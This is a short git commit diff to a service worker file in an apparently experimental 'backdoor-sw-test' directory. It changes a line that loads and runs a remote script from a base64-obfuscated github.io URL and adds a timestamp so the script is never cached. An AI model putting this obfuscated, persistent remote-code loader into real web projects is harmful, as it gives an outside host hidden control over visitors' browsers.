76d93864c8fb961a504c340b0d3155bd31e70ee5
Sean <ussa.say@gmail.com>
2019-09-15 12:13:24 -0700

    see if this prevents caching

--- backdoor-sw-test/sw.js
+++ backdoor-sw-test/sw.js
@@ -1,1 +1,1 @@
-importScripts(atob('aHR0cHM6Ly9zaGVlcHRlc3Rlci5naXRodWIuaW8vaGVsbG8td29ybGQvYmFja2Rvb3ItdGVzdC5qcw=='))
+importScripts(atob('aHR0cHM6Ly9zaGVlcHRlc3Rlci5naXRodWIuaW8vaGVsbG8td29ybGQvYmFja2Rvb3ItdGVzdC5qcw==') + '?' + Date.now())
